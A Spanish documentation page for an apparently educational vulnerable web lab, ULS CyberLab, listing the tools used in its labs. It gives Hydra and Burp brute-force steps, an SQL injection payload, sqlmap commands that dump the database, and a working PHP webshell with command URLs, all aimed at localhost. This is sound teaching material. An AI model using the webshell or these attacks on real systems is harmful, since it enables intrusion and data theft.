---
title: Herramientas
description: Herramientas de ciberseguridad utilizadas en ULS CyberLab
sidebar:
  order: 8
---

# Herramientas de Ciberseguridad

## Herramientas del Entorno

### XAMPP

| Aspecto | Detalle |
|---------|---------|
| **Tipo** | Servidor web local AIO |
| **Componentes** | Apache + MySQL + PHP + phpMyAdmin |
| **Uso** | Servidor de la plataforma |
| **Descarga** | [apachefriends.org](https://www.apachefriends.org/) |
| **Licencia** | Gratuita |

XAMPP es el entorno que hace posible que ULS CyberLab corra localmente en cualquier PC. El panel de control permite iniciar/detener Apache y MySQL con un clic.

```
XAMPP Control Panel
───────────────────
Apache    [Start] [Stop] [Admin]   → http://localhost/
MySQL     [Start] [Stop] [Admin]   → phpMyAdmin
```

### phpMyAdmin

Interfaz web para gestionar MySQL. Incluida en XAMPP.

**Usos en el proyecto:**
- Importar el schema `sql/setup.sql`
- Visualizar tablas durante las prácticas
- Ver cómo las queries modifican los datos
- Analizar el impacto de un ataque SQLi en los datos

**Acceso:** `http://localhost/phpmyadmin`

---

## Herramientas de Ataque / Ethical Hacking

### Burp Suite Community Edition

| Aspecto | Detalle |
|---------|---------|
| **Tipo** | Proxy HTTP / Herramienta de testing web |
| **Uso** | Interceptar, modificar y repetir peticiones HTTP |
| **Labs** | Brute Force (Intruder), SQLi manual, XSS |
| **Descarga** | [portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload) |
| **Licencia** | Gratuita (Community) |

#### Configuración Básica con ULS CyberLab

1. Abre Burp Suite → Proxy → Options
2. Configura: `127.0.0.1:8080`
3. En tu navegador, configura el proxy HTTP a `127.0.0.1:8080`
4. Activa **Intercept** en Burp → Proxy
5. Navega a `http://localhost/mini-cyberlab/`
6. Burp capturará todas las peticiones

#### Uso en el Lab de Brute Force

```
Burp Suite → Proxy → HTTP History
         → Click derecho en POST /modules/bruteforce.php
         → Send to Intruder
         → Intruder → Positions
         → Marca el campo "password"
         → Payloads → Simple List
         → Agrega wordlist (qwerty, 123456, password, etc.)
         → Start Attack
```

#### Uso en el Lab de SQLi

```
Burp Suite → Repeater
         → Modifica el parámetro "search"
         → Prueba payloads: ' OR '1'='1
         → Analiza la respuesta HTTP
```

---

### Hydra

| Aspecto | Detalle |
|---------|---------|
| **Tipo** | Password cracker por red |
| **Uso** | Ataques de diccionario/fuerza bruta |
| **Lab** | Brute Force (Lab 4) |
| **Plataforma** | Kali Linux / Linux |
| **Licencia** | GPL (Open Source) |

#### Comandos para ULS CyberLab

```bash
# Ataque básico contra el módulo de brute force
hydra -l ceo -P /usr/share/wordlists/rockyou.txt \
  -s 80 localhost \
  http-post-form \
  "/mini-cyberlab/modules/bruteforce.php:username=^USER^&password=^PASS^:Credenciales incorrectas" \
  -V

# Con wordlist personalizada (más rápido para el lab)
echo -e "qwerty\n123456\npassword\nadmin\nceo123" > wordlist.txt
hydra -l ceo -P wordlist.txt localhost \
  http-post-form \
  "/mini-cyberlab/modules/bruteforce.php:username=^USER^&password=^PASS^:Credenciales incorrectas"
```

#### Parámetros Importantes

| Parámetro | Significado |
|-----------|-------------|
| `-l ceo` | Usuario objetivo |
| `-P wordlist.txt` | Archivo de contraseñas |
| `-s 80` | Puerto (default: 80 para HTTP) |
| `-V` | Verbose: muestra cada intento |
| `-t 10` | 10 hilos paralelos |
| `^USER^` | Placeholder para usuario |
| `^PASS^` | Placeholder para password |

---

### curl (Command Line)

Útil para interactuar con las APIs del proyecto desde la terminal:

```bash
# Capturar una flag manualmente via API
curl -X POST http://localhost/mini-cyberlab/api/capture_flag.php \
  -b "PHPSESSID=tu_session_id" \
  -d "flag=FLAG{SQL_1NJ3CT10N_M4ST3R}"

# Ver logs de seguridad
curl http://localhost/mini-cyberlab/api/logs.php \
  -b "PHPSESSID=tu_session_id"

# Subir un archivo (Lab Upload)
curl -X POST http://localhost/mini-cyberlab/modules/upload.php \
  -b "PHPSESSID=tu_session_id" \
  -F "file=@shell.php"
```

---

## Herramientas del Navegador

### DevTools del Navegador

Integradas en Chrome/Firefox/Edge, son fundamentales para:

| Tab | Uso en el Lab |
|-----|--------------|
| **Network** | Ver peticiones HTTP, headers, body de respuestas |
| **Console** | Ver errores JS, ejecutar código para XSS |
| **Application** | Ver cookies de sesión (PHPSESSID) |
| **Sources** | Ver el código JavaScript de la página |
| **Elements** | Inspeccionar el DOM para encontrar XSS |

#### Ver la Cookie de Sesión

```
F12 → Application → Cookies → http://localhost
     → Busca: PHPSESSID = abc123...
```

---

## Herramientas para Análisis Avanzado

### SQLMap (Opcional - nivel avanzado)

```bash
# Detectar SQLi en el parámetro de búsqueda
sqlmap -u "http://localhost/mini-cyberlab/modules/sqli.php?search=test" \
  --cookie="PHPSESSID=tu_session" \
  --dbs

# Extraer la base de datos completa
sqlmap -u "http://localhost/mini-cyberlab/modules/sqli.php?search=test" \
  --cookie="PHPSESSID=tu_session" \
  -D uls_cyberlab \
  --tables \
  --dump
```

:::caution
SQLMap es una herramienta poderosa. Usar **únicamente** contra sistemas propios o con autorización explícita.
:::

### Wfuzz / Gobuster (para descubrimiento de directorios)

```bash
# Descubrir archivos en el proyecto
gobuster dir -u http://localhost/mini-cyberlab/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html

# Con wfuzz
wfuzz -c -w /usr/share/wordlists/dirb/common.txt \
  --hc 404 \
  http://localhost/mini-cyberlab/FUZZ
```

---

## Webshell PHP (Lab de Upload)

### Shell Mínima para el Laboratorio

```php
<?php
// shell.php - Webshell básica para el Lab 3
// SOLO para uso en laboratorios controlados
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

**Uso después de subir:**
```
http://localhost/mini-cyberlab/uploads/shell.php?cmd=whoami
http://localhost/mini-cyberlab/uploads/shell.php?cmd=dir
http://localhost/mini-cyberlab/uploads/shell.php?cmd=ipconfig
http://localhost/mini-cyberlab/uploads/shell.php?cmd=net user
```

---

## Resumen de Herramientas por Laboratorio

| Lab | Herramienta Principal | Alternativa |
|-----|----------------------|-------------|
| SQL Injection | Navegador + DevTools | Burp Repeater, SQLMap |
| XSS | Navegador (alert/console) | Burp, DevTools |
| File Upload | Navegador + curl | Burp, Postman |
| Brute Force | Hydra | Burp Intruder, Medusa |
| General | XAMPP + phpMyAdmin | DBeaver, MySQL CLI |

---

## Kali Linux — El Sistema Operativo del Ethical Hacker

Para usar Hydra y otras herramientas avanzadas, se recomienda **Kali Linux**:

| Aspecto | Detalle |
|---------|---------|
| **Tipo** | Distribución Linux para pentest |
| **Herramientas incluidas** | 600+ herramientas de seguridad |
| **Hydra** | Pre-instalado |
| **Burp Suite** | Pre-instalado (Community) |
| **SQLMap** | Pre-instalado |
| **Descarga** | [kali.org/get-kali](https://www.kali.org/get-kali/) |

### Configurar Kali para atacar el Lab en Windows

```
[Kali Linux VM] ──────────────── [Windows Host]
                   Red: NAT/Host-only
                   
En Kali: hydra -l ceo -P wordlist.txt 192.168.x.x ...
En Windows: XAMPP corriendo el proyecto
```
